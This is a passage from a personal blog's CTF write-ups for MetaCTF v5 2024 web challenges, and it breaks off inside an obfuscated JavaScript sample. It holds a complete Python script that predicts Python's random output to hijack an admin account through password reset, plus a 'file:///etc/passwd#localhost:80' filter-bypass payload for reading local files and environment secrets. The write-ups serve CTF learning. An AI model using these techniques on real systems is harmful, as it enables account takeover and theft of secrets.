<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->

<html lang="en-US" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>MetaCTF v5 2024 Writeups - 0xOZ</title>
<meta name="description" content="Writeups for the MetaCTF v5 2024 CTF Web Challenges that was held on 30th June 2024.">


  <meta name="author" content="Ahmad Abuzaid">
  
  <meta property="article:author" content="Ahmad Abuzaid">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="0xOZ">
<meta property="og:title" content="MetaCTF v5 2024 Writeups">
<meta property="og:url" content="https://0x0oz.github.io/writeups/metactf-v5-2024">


  <meta property="og:description" content="Writeups for the MetaCTF v5 2024 CTF Web Challenges that was held on 30th June 2024.">



  <meta property="og:image" content="https://0x0oz.github.io/assets/images/metactf-writeups/metactfv5.png">





  <meta property="article:published_time" content="2024-07-10T00:00:00+03:00">





  

  


<link rel="canonical" href="https://0x0oz.github.io/writeups/metactf-v5-2024">







  <meta name="google-site-verification" content="ww_2BCRJI0KecYEv76M0OGzJWWFp2kE5CEc6sZSpj7Y" />





  <meta name="naver-site-verification" content="naver-site-verification">


<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="0xOZ Feed">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script type="text/javascript">
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
  window.enable_copy_code_button = true;
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--posts" dir="ltr">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/logo.png" alt="0xOZ"></a>
        
        <a class="site-title" href="/">
          0xOZ
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a
                href="/"
                
                
              >Home</a>
            </li><li class="masthead__menu-item">
              <a
                href="/about/"
                
                
              >About</a>
            </li><li class="masthead__menu-item">
              <a
                href="/sitemap/"
                
                
              >Sitemap</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      




  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>

          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#writeups" itemprop="item"><span itemprop="name">Writeups</span></a>
          <meta itemprop="position" content="2" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        <li class="current">MetaCTF v5 2024 Writeups</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person" class="h-card">

  
    <div class="author__avatar">
      <a href="https://0x0oz.github.io/">
        <img src="/assets/images/bio-photo.png" alt="Ahmad Abuzaid" itemprop="image" class="u-photo">
      </a>
    </div>
  

  <div class="author__content">
    <h3 class="author__name p-name" itemprop="name">
      <a class="u-url" rel="me" href="https://0x0oz.github.io/" itemprop="url">Ahmad Abuzaid</a>
    </h3>
    
      <div class="author__bio p-note" itemprop="description">
        <p>I am an <strong>amazing</strong> person.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Earth</span>
        </li>
      

      
        
          
            <li><a href="mailto:iiahmad435@gmail.com" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
        
          
        
          
        
          
            <li><a href="https://github.com/0x0OZ" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://instagram.com/0x0oz_" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
          
        
      

      

      
        <li>
          <a href="mailto:iiahmad435@gmail.com" rel="me" class="u-email">
            <meta itemprop="email" content="iiahmad435@gmail.com" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="MetaCTF v5 2024 Writeups">
    <meta itemprop="description" content="Writeups for the MetaCTF v5 2024 CTF Web Challenges that was held on 30th June 2024.">
    <meta itemprop="datePublished" content="2024-07-10T00:00:00+03:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">
            <a href="https://0x0oz.github.io/writeups/metactf-v5-2024" itemprop="url">MetaCTF v5 2024 Writeups
</a>
          </h1>
          

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Table of Contents</h4></header>
              <ul class="toc__menu"><li><a href="#pythons-twister">Python’s Twister</a><ul><li><a href="#challenge-description">Challenge Description</a></li><li><a href="#solution">Solution</a></li></ul></li><li><a href="#white">White</a><ul><li><a href="#challenge-description-1">Challenge Description</a></li><li><a href="#solution-1">Solution</a></li></ul></li><li><a href="#scamming-factory-12">Scamming Factory (1/2)</a><ul><li><a href="#challenge-description-2">Challenge Description</a></li><li><a href="#solution-2">Solution</a></li></ul></li><li><a href="#cham">Cham</a><ul><li><a href="#challenge-description-3">Challenge Description</a></li><li><a href="#solution-3">Solution</a></li></ul></li></ul>
            </nav>
          </aside>
        
        <p>Writeups for the MetaCTF v5 2024 CTF Web Challenges that was held on 30th June 2024.</p>

<h2 id="pythons-twister">Python’s Twister</h2>

<h3 id="challenge-description">Challenge Description</h3>

<p>Hack our admin.</p>

<h3 id="solution">Solution</h3>

<p>The challenge is a simple flask application that has register/login/pass-reset functionalities. The app generates 10000 random numbers and assigns one to each user when registered as a reset token, the admin has the reset token with index 1499. The flag is stored in an environment variable and is displayed when the admin logs in.</p>

<p>The first to look at is how the secrets are generated, they use python’s random and it doesn’t seem to be realistic (CTFs momento), we all know that the default random number generators in programming languages are predictable and Python is no exception. From Python <a href="https://docs.python.org/3/library/random.html">docs</a>:</p>

<blockquote>
  <p>Warning</p>

  <p>The pseudo-random generators of this module should not be used for security purposes. For security or cryptographic uses, see the <a href="https://docs.python.org/3/library/secrets.html#module-secrets"><code class="language-plaintext highlighter-rouge">secrets</code></a> module.</p>
</blockquote>

<p>The challenge code is as follows:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">flash</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">import</span> <span class="n">os</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">())</span>

<span class="c1"># Simulated database
</span><span class="n">users</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">reset_tokens</span> <span class="o">=</span> <span class="p">{}</span>

<span class="c1"># Function to generate 10000 random numbers and assign one to each user
</span><span class="k">def</span> <span class="nf">generate_random_numbers</span><span class="p">():</span>
    <span class="n">random_numbers</span> <span class="o">=</span> <span class="p">[</span><span class="n">random</span><span class="p">.</span><span class="nf">getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">)]</span>
    <span class="k">return</span> <span class="n">random_numbers</span>

<span class="n">random_numbers</span> <span class="o">=</span> <span class="nf">generate_random_numbers</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">get_username_by_secret</span><span class="p">(</span><span class="n">users</span><span class="p">,</span> <span class="n">secret</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">username</span><span class="p">,</span> <span class="n">info</span> <span class="ow">in</span> <span class="n">users</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
        <span class="k">if</span> <span class="n">info</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">secret</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="n">secret</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">username</span>
    <span class="k">return</span> <span class="bp">None</span>

<span class="c1"># Function to generate a random secret
</span><span class="k">def</span> <span class="nf">generate_secret</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="n">random_int</span> <span class="o">=</span> <span class="n">random_numbers</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">random_int</span><span class="si">}</span><span class="sh">"</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">users</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Welcome admin here is your flag </span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="nf">getenv</span><span class="p">(</span><span class="sh">'</span><span class="s">FLAG</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Welcome </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">! Your password reset token is </span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">secret</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid credentials</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/register</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">User already exists</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">random_numbers</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">No more random numbers available for registration</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">secret</span> <span class="o">=</span> <span class="nf">generate_secret</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
                <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
                    <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
                    <span class="sh">'</span><span class="s">secret</span><span class="sh">'</span><span class="p">:</span> <span class="n">secret</span>
                <span class="p">}</span>
                <span class="nf">flash</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Registration successful! Your password reset token is </span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
                <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">register.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/reset_password</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">reset_password</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">reset_token</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">reset_token</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">new_password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">new_password</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">username</span> <span class="o">=</span> <span class="nf">get_username_by_secret</span><span class="p">(</span><span class="n">users</span><span class="p">,</span> <span class="n">reset_token</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
            <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_password</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Password reset successful</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid reset token</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">reset_password.html</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># Create an admin account 
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">admin_secret</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin-</span><span class="si">{</span><span class="n">random_numbers</span><span class="p">[</span><span class="mi">1499</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
    <span class="n">users</span><span class="p">[</span><span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="s">passdsipjfouyqevtwbnou074969546aYHGSHBKGH</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">())</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">secret</span><span class="sh">'</span><span class="p">:</span> <span class="n">admin_secret</span>
    <span class="p">}</span>
    <span class="n">random_numbers</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="mi">1499</span><span class="p">)</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<p>There is a Python library (<a href="https://github.com/tna0y/Python-random-module-cracker">randcrack</a>) that lets you predict the exact seed that is being used if you provide it with a sequence of 624 random numbers, to follow that I generated a full PoC that registers the required sequence of accounts to get their secrets, provides them to randcrack, get the admin’s secret at the next random number after (1499-624) random numbers, reset the admin’s password and logs in to get the flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">randcrack</span> <span class="kn">import</span> <span class="n">RandCrack</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">re</span>

<span class="n">rc</span> <span class="o">=</span> <span class="nc">RandCrack</span><span class="p">()</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://f1d27711-f60a-4516-81ea-82cbb6bdea72.cscpsut.com</span><span class="sh">"</span>
<span class="c1"># url = "http://127.0.0.1:5000"
</span>
<span class="n">holder</span> <span class="o">=</span> <span class="sh">"</span><span class="s">oz</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">624</span><span class="p">):</span>
    <span class="n">username</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">holder</span><span class="si">}{</span><span class="n">i</span><span class="si">}</span><span class="sh">"</span>
    <span class="n">password</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">holder</span><span class="si">}{</span><span class="n">i</span><span class="si">}</span><span class="sh">"</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/register</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Your password reset token is </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">-(-?\d+)</span><span class="sh">"</span><span class="p">,</span>
        <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span>
    <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">rc</span><span class="p">.</span><span class="nf">submit</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Submitted </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="se">\t</span><span class="s"> </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>

<span class="nf">print</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1499</span> <span class="o">-</span> <span class="mi">624</span><span class="p">):</span>
    <span class="n">rc</span><span class="p">.</span><span class="nf">predict_getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>

<span class="n">admin_secret</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin-</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">rc</span><span class="p">.</span><span class="nf">predict_getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="si">}</span><span class="sh">"</span>

<span class="nf">print</span><span class="p">(</span><span class="n">admin_secret</span><span class="p">)</span>

<span class="c1"># reset password
</span><span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
    <span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/reset_password</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">reset_token</span><span class="sh">"</span><span class="p">:</span> <span class="n">admin_secret</span><span class="p">,</span> <span class="sh">"</span><span class="s">new_password</span><span class="sh">"</span><span class="p">:</span> <span class="n">holder</span><span class="p">}</span>
<span class="p">)</span>


<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">holder</span><span class="p">})</span>
<span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

</code></pre></div></div>

<p>The flag:</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-twister-01.png" alt="metactfv5-twister-01" /></p>

<h2 id="white">White</h2>

<h3 id="challenge-description-1">Challenge Description</h3>

<p>Our intel team has found a web page which looks innocuous, but seems to be hiding secrets locally…</p>

<h3 id="solution-1">Solution</h3>

<p>There is a simple LFI when we click on one of the posts button,</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-white-01.png" alt="metactfv5-white-01" /></p>

<p>If we play with it a bit we will notice that it blocks any request that doesn’t contain the <code class="language-plaintext highlighter-rouge">localhost:80</code>, from this I tried different bypasses and techniques and this payload worked <code class="language-plaintext highlighter-rouge">file:///etc/passwd#localhost:80</code>:</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-white-02.png" alt="metactfv5-white-02" /></p>

<p>Finally, we can read the flag at <code class="language-plaintext highlighter-rouge">/proc/self/environ</code>, but I want to go a bit further and read the application source code.</p>

<p>Through <code class="language-plaintext highlighter-rouge">/proc/self/cmdline</code> we can tell that the application is called <code class="language-plaintext highlighter-rouge">app.py</code> and from looking at other different challenges I guessed that the challenge files are stored in <code class="language-plaintext highlighter-rouge">/app</code> directory with this lucky guess we can read the source at <code class="language-plaintext highlighter-rouge">/app/app.py</code></p>

<p><img src="/assets/images/metactf-writeups/metactfv5-white-03.png" alt="metactfv5-white-03" /></p>

<p>And at the same source level we can read the <code class="language-plaintext highlighter-rouge">flag.txt</code> which I knew about from reading the <code class="language-plaintext highlighter-rouge">entrypoint.sh</code></p>

<p><img src="/assets/images/metactf-writeups/metactfv5-white-04.png" alt="metactfv5-white-04" /></p>

<h2 id="scamming-factory-12">Scamming Factory (1/2)</h2>

<h3 id="challenge-description-2">Challenge Description</h3>

<p>I was looking for machines for my new factory and I came across this website. It seems weird and it has a lot of ads popping up. Can you take a look at it for me?</p>

<h3 id="solution-2">Solution</h3>

<p>The challenge website has a weird theme where it pops-up fake scare-wares whenever you click on something, there didn’t seem to be any visible backend functionalities from the buttons/code provided, the page’s sources didn’t have anything interesting but simple items listing with no functionalities, except a small obfuscated JS code that wasn’t clear what it was doing</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-scamfactory-01.png" alt="metactfv5-scamfactory-01" /></p>

<p>The obfuscated JS code that I found in <code class="language-plaintext highlighter-rouge">/js/addon.js</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">uniqueId</span><span class="p">;(</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">qSg</span><span class="o">=</span><span class="dl">''</span><span class="p">,</span><span class="nx">JDm</span><span class="o">=</span><span class="mi">949</span><span class="o">-</span><span class="mi">938</span><span class="p">;</span><span class="kd">function</span> <span class="nf">WYh</span><span class="p">(</span><span class="nx">b</span><span class="p">){</span><span class="kd">var</span> <span class="nx">r</span><span class="o">=</span><span class="mi">1320763</span><span class="p">;</span><span class="kd">var</span> <span class="nx">z</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="kd">var</span> <span class="nx">l</span><span class="o">=</span><span class="p">[];</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">t</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">t</span><span class="o">&lt;</span><span class="nx">z</span><span class="p">;</span><span class="nx">t</span><span class="o">++</span><span class="p">){</span><span class="nx">l</span><span class="p">[</span><span class="nx">t</span><span class="p">]</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nf">charAt</span><span 